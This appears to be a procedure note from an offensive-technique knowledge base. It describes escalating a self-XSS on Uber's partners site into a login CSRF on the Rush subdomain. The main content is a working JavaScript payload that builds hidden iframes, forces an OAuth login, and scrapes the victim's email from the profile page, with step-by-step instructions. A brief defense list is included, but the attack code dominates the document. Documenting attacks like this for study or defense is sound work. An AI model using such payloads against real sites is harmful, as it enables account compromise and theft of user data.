---
tags:
  - xss
  - chaining
  - data-theft
  - iframe
  - csrf
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/javascript-iframe-chaining-rush-theft]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:16:14.500Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 682cb972-6c90-4e24-a7da-0d443b474835
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Chain-XSS-to-Steal-Rush-User-Data-via-Iframes

## Summary

This procedure escalates the self-XSS by injecting JavaScript that creates hidden iframes to perform a login CSRF on Uber's Rush service (getrush.uber.com) and extract sensitive data like the user's email from the profile page.

## Description

Leveraging the XSS execution context, the script creates an iframe to auto-login to Rush via OAuth, waits 9 seconds for session establishment, then loads the business profile in another iframe and extracts the email from the .input-group element using onload. This chains the vuln across subdomains for data exfiltration.

## Requirements

1. Successful XSS execution on partners.uber.com
2. Victim's session valid for Rush subdomain
3. No iframe restrictions (though same-org may allow)

## Defense

Defensive measures and detection strategies:

- Enforce same-origin policy strictly; block cross-subdomain iframes
- Validate OAuth redirects and add CSRF tokens to login flows
- Monitor for anomalous iframe creations and data alerts

## Objectives

1. Perform implicit login CSRF to Rush
2. Load and scrape profile data
3. Exfiltrate email via alert (or other channels)

## Instructions

### Step 1: Inject Chaining Script

**Context**: Replace simple payload with full JS to create and manage iframes.

**Command** ([[commands/javascript-iframe-chaining-rush-theft]]):
```javascript
//Create the iframe to log the user to rush
var rushReg = document.createElement('iframe');
rushReg.setAttribute('src', 'https://getrush.uber.com/oauth/login?original=https://rush.uber.com');
document.body.appendChild(rushReg);
alert('done');

setTimeout(function() {
var profileIframe = document.createElement('iframe');
profileIframe.setAttribute('src', 'https://getrush.uber.com/business');
profileIframe.setAttribute('id', 'pi');
document.body.appendChild(profileIframe);
profileIframe.onload = function() {
var d = document.getElementsByClassName('input-group')[0].innerHTML;
alert(d);
}
}, 9000);
```

> Save profile and revisit enrollment page. Expected: 'done' alert, then email HTML alert after delay.

### Step 2: Verify Data Extraction

**Context**: Check alerts for stolen data.

**Command** ([[No Command]]):

Observe pop-ups; inspect iframe contents in DevTools if needed.

> Expected: InnerHTML of input-group contains email.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/javascript-iframe-chaining-rush-theft]]

## Tools Used


## Tags

- chaining
- iframe
- data-theft
